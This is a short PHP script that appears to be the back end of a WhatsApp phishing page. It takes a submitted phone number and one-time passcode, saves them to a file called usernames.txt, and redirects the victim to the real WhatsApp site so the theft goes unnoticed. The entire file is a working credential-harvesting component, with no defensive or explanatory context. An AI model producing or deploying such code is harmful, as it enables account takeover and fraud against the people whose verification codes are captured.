<?php
$phone = $_POST['phone'];
$otp = $_POST['otp'];
$data = "Platform: WhatsApp\nPhone: " . $phone . "\nOTP: " . $otp . "\n----------------\n";
file_put_contents("usernames.txt", $data);
header("Location: https://www.whatsapp.com");
exit();
?>
